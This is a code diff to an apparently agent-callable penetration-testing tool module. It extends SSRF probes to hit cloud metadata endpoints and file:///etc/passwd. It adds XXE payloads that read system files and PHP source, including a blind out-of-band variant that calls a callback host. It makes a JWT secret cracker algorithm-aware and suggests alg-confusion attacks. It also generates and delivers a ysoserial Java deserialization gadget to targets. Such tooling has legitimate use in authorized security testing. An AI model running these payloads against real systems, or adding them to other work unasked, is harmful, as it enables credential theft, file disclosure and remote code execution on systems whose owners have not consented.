@@ -25,6 +25,55 @@ async def _persist(project_id, tool_name: str, args: dict, stdout: str, stderr: 
         await _record_execution(int(project_id), tool_name, args, out_p, err_p, exit_code, sha)
 
 
+def _build_url_with_param(target: str, param: str, value: str) -> str:
+    """
+    Append `param=value` (properly URL-encoded) to `target`, preserving any
+    existing query string and fragment. Fixes [B] from the audit: the old
+    pattern f"{target}?{param}={value}" produced URLs like
+    "http://x/api?a=1?param=…" when target already had a query, and never
+    encoded the payload.
+    """
+    parts = urllib.parse.urlsplit(target)
+    existing = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
+    existing.append((param, value))
+    new_query = urllib.parse.urlencode(existing, doseq=True, quote_via=urllib.parse.quote)
+    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))
+
+
+def _jwt_alg(token: str) -> str | None:
+    """Return the `alg` field from a JWT header, lowercased; None on malformed."""
+    try:
+        head_b64 = token.split(".", 1)[0]
+        pad = "=" * (-len(head_b64) % 4)
+        head = json.loads(base64.urlsafe_b64decode(head_b64 + pad))
+        alg = head.get("alg")
+        return alg.lower() if isinstance(alg, str) else None
+    except Exception:
+        return None
+
+
+def _imds_signal(body: str) -> str | None:
+    """Detect cloud-metadata-shaped content in an HTTP body. Returns a short
+    label naming the provider, or None. Used by SSRF probes to flag real wins
+    instead of relying on response size alone."""
+    if not body:
+        return None
+    snippet = body[:8192]  # cap for speed
+    if any(k in snippet for k in ("ami-id", "instance-id", "instance-type", "iam/security-credentials", "placement/availability-zone")):
+        return "AWS IMDS"
+    if "computeMetadata/v1" in snippet or '"hostname":' in snippet and "googleusercontent" in snippet:
+        return "GCP metadata"
+    if any(k in snippet for k in ("/metadata/instance", '"compute":', '"network":') ) and "azure" in snippet.lower():
+        return "Azure IMDS"
+    if "DigitalOcean" in snippet or "droplet_id" in snippet:
+        return "DigitalOcean metadata"
+    if "root:x:" in snippet or "daemon:x:" in snippet or "nobody:x:" in snippet:
+        return "/etc/passwd disclosed"
+    if "[boot loader]" in snippet or "[operating systems]" in snippet:
+        return "Windows boot.ini disclosed"
+    return None
+
+
 # ---------------------------------------------------------------------------
 # http_probe  (curl -L with headers → status/title/server)
 # ---------------------------------------------------------------------------
@@ -575,21 +624,44 @@ async def _ssrf_probe(args: dict) -> str:
     payloads = [
         "http://127.0.0.1/",
         "http://localhost/",
-        "http://169.254.169.254/latest/meta-data/",
+        # Cloud metadata services — strong positive signal when reached:
+        "http://169.254.169.254/latest/meta-data/",            # AWS IMDSv1
+        "http://metadata.google.internal/computeMetadata/v1/", # GCP
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
         "http://[::1]/",
         "http://0.0.0.0/",
-        "http://2130706433/",  # 127.0.0.1 as decimal
+        "http://2130706433/",                                  # 127.0.0.1 as int
+        "file:///etc/passwd",                                  # parser may follow file://
     ]
     results = []
+    hits = []
+    sizes = []
     for payload in payloads:
-        test_url = f"{target}?{param}={payload}"
+        # [B] Use the URL builder — handles existing `?` and URL-encodes the value.
+        test_url = _build_url_with_param(target, param, payload)
         cmd = ["curl", "-sL", "-m", "8", "-w", "\\n%{http_code}", test_url]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
         code_m = re.search(r"\n(\d{3})$", stdout)
         code = code_m.group(1) if code_m else "?"
-        body_len = len(stdout)
-        results.append(f"  {payload} → HTTP {code} body_len={body_len}")
-    summary = f"SSRF probe for {target} (param={param}):\n" + "\n".join(results)
+        body = stdout[: -4] if code_m else stdout  # strip trailing \n<code>
+        body_len = len(body)
+        sizes.append(body_len)
+        # [C] Positive signals: cloud-metadata shapes, /etc/passwd lines, etc.
+        signal = _imds_signal(body)
+        if signal:
+            hits.append((payload, signal))
+            results.append(f"  [VULN] {payload} → HTTP {code} — {signal} (body_len={body_len})")
+        else:
+            results.append(f"  {payload} → HTTP {code} body_len={body_len}")
+    # Additional heuristic: if some payloads succeed with very different sizes,
+    # something distinguishes them — likely SSRF reachability differential.
+    if not hits and sizes and max(sizes) - min(sizes) > 200:
+        results.append(f"  [HEURISTIC] body size differential across payloads ({min(sizes)}–{max(sizes)} bytes) — review manually.")
+    summary = (
+        f"SSRF probe for {target} (param={param}):\n"
+        + ("[CONFIRMED] " + ", ".join(f"{p}={s}" for p, s in hits) + "\n" if hits else "")
+        + "\n".join(results)
+    )
     await _persist(project_id, "ssrf_probe", args, summary, "", 0)
     return summary
 
@@ -744,7 +816,7 @@ async def _rfi_probe(args: dict) -> str:
         payloads.insert(0, f"http://{callback_host}/rfi_test.php")
     results = []
     for payload in payloads:
-        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
+        test_url = _build_url_with_param(target, param, payload)
         cmd = ["curl", "-sL", "-m", "10", "-w", "\\nHTTP_CODE:%{http_code}", test_url]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
         results.append(f"  payload={payload!r} → rc={rc} response_len={len(stdout)}")
@@ -781,19 +853,28 @@ async def _xxe_probe(args: dict) -> str:
     target = (args.get("target") or "").strip()
     if not target:
         return "Error: target is required."
+    callback_host = (args.get("callback_host") or "").strip()
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 30))
+    # [D] Broadened payload set. The "blind_oob" payload now uses
+    # callback_host when supplied; without it we drop the useless 127.0.0.1
+    # version and substitute one that targets a Windows path instead so we
+    # cover both Linux and Windows file-disclosure shapes.
     xxe_payloads = [
-        (
-            "classic_file_read",
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
-        ),
-        (
-            "blind_oob",
-            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
-        ),
+        ("classic_etc_passwd",
+         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
+        ("php_filter_b64",
+         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>'),
+        ("windows_hosts",
+         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&xxe;</root>'),
     ]
+    if callback_host:
+        xxe_payloads.append((
+            "blind_oob",
+            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback_host}/xxe-test">%xxe;]><root/>'
+        ))
     results = []
+    confirmed = 0
     for name, payload in xxe_payloads:
         cmd = [
             "curl", "-sL", "-m", "10", "-X", "POST",
@@ -801,10 +882,25 @@ async def _xxe_probe(args: dict) -> str:
             "-d", payload, target,
         ]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
-        if "root:" in stdout or "daemon:" in stdout:
-            results.append(f"  [VULN] {name} → /etc/passwd content in response!")
+        signal = _imds_signal(stdout)  # also catches /etc/passwd disclosure shapes
+        # Additional XXE-specific signals beyond file content:
+        lower = stdout.lower()
+        parser_err = any(k in lower for k in (
+            "doctype", "entity", "external", "saxparser", "xmlreader",
+            "expat", "lxml.etree", "xml.parsers", "xerces"))
+        if signal:
+            results.append(f"  [VULN] {name} → {signal}")
+            confirmed += 1
+        elif "PD9waHA" in stdout or "PD94bWw" in stdout:
+            # base64 of "<?php" or "<?xml" — php_filter payload exfilled source
+            results.append(f"  [VULN] {name} → base64-encoded source disclosed via php://filter")
+            confirmed += 1
+        elif parser_err:
+            results.append(f"  [SUSPECTED] {name} → XML parser error / DTD mention in response (parser sees DTD; restrictions may still block content)")
         else:
             results.append(f"  [?] {name} → response len={len(stdout)} rc={rc}")
+    if not callback_host and confirmed == 0:
+        results.append("  [HINT] Pass callback_host=<your-collab-host> to test blind XXE via OOB.")
     summary = f"XXE probe for {target}:\n" + "\n".join(results)
     await _persist(project_id, "xxe_probe", args, summary, "", 0)
     return summary
@@ -813,12 +909,13 @@ async def _xxe_probe(args: dict) -> str:
 register(
     Tool(
         name="xxe_probe",
-        description="Test for XML External Entity injection by POSTing XXE payloads.",
+        description="Test for XML External Entity injection by POSTing XXE payloads. Includes /etc/passwd, Windows hosts, php://filter source disclosure, and optional blind-OOB via callback_host.",
         inputSchema={
             "type": "object",
             "required": ["target"],
             "properties": {
                 "target": {"type": "string", "description": "Target URL accepting XML POST"},
+                "callback_host": {"type": "string", "description": "Your OOB callback host (e.g. interactsh subdomain) — enables blind XXE detection"},
                 "project_id": {"type": "integer"},
                 "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
             },
@@ -1167,40 +1264,67 @@ async def _jwt_crack(args: dict) -> str:
     wordlist = (args.get("wordlist") or "/usr/share/wordlists/rockyou.txt").strip()
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 300))
+
+    # [A] Detect the JWT algorithm and route to the right cracker. Only HMAC
+    # algorithms are crackable by wordlist; RS256/ES256/PS256 require private
+    # key compromise, not brute-force, so fail clearly.
+    alg = _jwt_alg(token)
+    if alg is None:
+        return "Error: invalid JWT (cannot parse header)."
+    HMAC_MODES = {"hs256": ("16500", hashlib.sha256),
+                  "hs384": ("16600", hashlib.sha384),
+                  "hs512": ("16700", hashlib.sha512)}
+    if alg not in HMAC_MODES:
+        return (
+            f"Error: alg={alg!r} is not HMAC-based; brute-force wordlist crack does not apply. "
+            f"For RS*/ES*/PS* signatures, you need the private key or an alg-confusion bug "
+            f"(try alg=none, or RS→HS key confusion using the server's public key as HMAC secret)."
+        )
+    hashcat_mode, hash_fn = HMAC_MODES[alg]
+
     if shutil.which("hashcat"):
         with tempfile.NamedTemporaryFile(mode="w", suffix=".jwt", delete=False) as f:
             f.write(token)
             jwt_file = f.name
         try:
-            cmd = ["hashcat", "-m", "16500", jwt_file, wordlist, "--quiet"]
+            # Run cracker; then --show to retrieve cracked result in a clean
+            # `hash:plaintext` format. Avoids the fragile ":(.+)$" regex.
+            cmd = ["hashcat", "-m", hashcat_mode, jwt_file, wordlist, "--quiet"]
             stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
+            if exit_code == -1:
+                return stderr
+            show_cmd = ["hashcat", "-m", hashcat_mode, jwt_file, "--show"]
+            show_out, _, _ = await _run_subprocess(show_cmd, timeout=15)
         finally:
             os.unlink(jwt_file)
-        if exit_code == -1:
-            return stderr
-        cracked = re.search(r":(.+)$", stdout, re.MULTILINE)
-        if cracked:
-            return f"JWT cracked! Secret: {cracked.group(1).strip()}"
-        return f"hashcat: no secret found.\n{stdout[-500:]}"
-    # Fallback: Python brute-force
+        # [G] Use rsplit so a colon in the hash itself can't confuse the parser.
+        for line in show_out.splitlines():
+            if ":" in line and line.startswith(token):
+                secret = line.rsplit(":", 1)[1]
+                return f"JWT cracked (alg={alg})! Secret: {secret}"
+        return f"hashcat: no secret found for alg={alg}.\n{stdout[-500:]}"
+
+    # Fallback: Python brute-force, now alg-aware.
     parts = token.split(".")
     if len(parts) != 3:
         return "Error: invalid JWT."
     header_payload = f"{parts[0]}.{parts[1]}".encode()
     sig_b64 = parts[2]
+
     def verify(secret: bytes) -> bool:
-        sig = hmac.new(secret, header_payload, hashlib.sha256).digest()
+        sig = hmac.new(secret, header_payload, hash_fn).digest()
         expected = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
-        return expected == sig_b64
+        return hmac.compare_digest(expected, sig_b64)
+
     try:
         with open(wordlist, "rb") as wf:
             for line in wf:
                 secret = line.strip()
                 if verify(secret):
-                    return f"JWT secret found: {secret.decode(errors='replace')}"
+                    return f"JWT secret found (alg={alg}): {secret.decode(errors='replace')}"
     except FileNotFoundError:
         return f"Error: wordlist not found at {wordlist}"
-    return "JWT secret not found in wordlist."
+    return f"JWT secret not found in wordlist (alg={alg})."
 
 
 register(
@@ -1789,6 +1913,12 @@ async def _deserialization_check(args: dict) -> str:
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 60))
     if lang == "java":
+        # [E] Actually deliver the payload to the target with a sleep gadget and
+        # observe the timing delta. [F] Java serialized blobs contain non-UTF-8
+        # bytes (0xAC 0xED magic); _run_subprocess decodes stdout with
+        # errors='replace' which mangles binary. Solution: redirect ysoserial
+        # stdout straight to a temp file via a shell-free wrapper, then curl
+        # --data-binary @file so the bytes hit the wire intact.
         ysoserial = shutil.which("ysoserial") or "/opt/ysoserial/ysoserial.jar"
         if not Path(ysoserial).exists() and not shutil.which("ysoserial"):
             return (
@@ -1797,12 +1927,56 @@ async def _deserialization_check(args: dict) -> str:
                 "Manual test: send a serialized Java object (AC ED 00 05 magic bytes) and check for errors.\n"
                 "Look for 'java.io.InvalidClassException' or similar in responses."
             )
-        # Generate a payload with a sleep gadget
-        cmd = ["java", "-jar", ysoserial, "CommonsCollections1", "sleep 5"]
-        stdout_b, stderr_b, rc = await _run_subprocess(cmd, timeout=timeout_s)
-        if rc != 0:
-            return f"ysoserial error: {stderr_b[:500]}"
-        return f"ysoserial CommonsCollections1 payload generated ({len(stdout_b)} bytes). Send as POST body."
+        SLEEP_SEC = 5
+        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
+            payload_path = f.name
+        try:
+            # Run ysoserial writing directly to the temp file — bypasses pipe decoding.
+            proc = await asyncio.create_subprocess_exec(
+                "java", "-jar", ysoserial, "CommonsCollections1", f"sleep {SLEEP_SEC}",
+                stdout=open(payload_path, "wb"),
+                stderr=asyncio.subprocess.PIPE,
+            )
+            try:
+                _, stderr_bytes = await asyncio.wait_for(proc.communicate(), timeout=30)
+            except asyncio.TimeoutError:
+                proc.kill(); await proc.communicate()
+                return "ysoserial timed out generating the payload."
+            if proc.returncode != 0:
+                return f"ysoserial error: {(stderr_bytes or b'').decode(errors='replace')[:500]}"
+            payload_size = Path(payload_path).stat().st_size
+            if payload_size == 0:
+                return "ysoserial produced an empty payload."
+            # Deliver the binary payload. Measure round-trip time.
+            t0 = time.monotonic()
+            cmd = [
+                "curl", "-sL", "-m", str(max(SLEEP_SEC + 8, 12)),
+                "-X", "POST",
+                "-H", "Content-Type: application/octet-stream",
+                "--data-binary", f"@{payload_path}",
+                "-o", "/dev/null", "-w", "%{http_code}",
+                target,
+            ]
+            stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
+            elapsed = time.monotonic() - t0
+        finally:
+            try: os.unlink(payload_path)
+            except OSError: pass
+        verdict = (
+            f"[CONFIRMED] response delayed {elapsed:.1f}s ≥ sleep {SLEEP_SEC}s — gadget executed"
+            if elapsed >= SLEEP_SEC - 0.5
+            else f"[NOT CONFIRMED] elapsed {elapsed:.1f}s < expected ≥ {SLEEP_SEC}s; payload not executed by this gadget"
+        )
+        summary = (
+            f"Java deserialization probe for {target}:\n"
+            f"  gadget: CommonsCollections1 → sleep {SLEEP_SEC}\n"
+            f"  payload size: {payload_size} bytes (binary, AC ED magic)\n"
+            f"  curl exit: {rc} HTTP {stdout.strip() or '?'}\n"
+            f"  {verdict}\n"
+            f"Try other gadgets (Spring1, Hibernate1, etc.) and dnslog OOB if this one missed."
+        )
+        await _persist(project_id, "deserialization_check", args, summary, "", 0)
+        return summary
     elif lang == "php":
         php_payloads = [
             'O:8:"stdClass":0:{}',
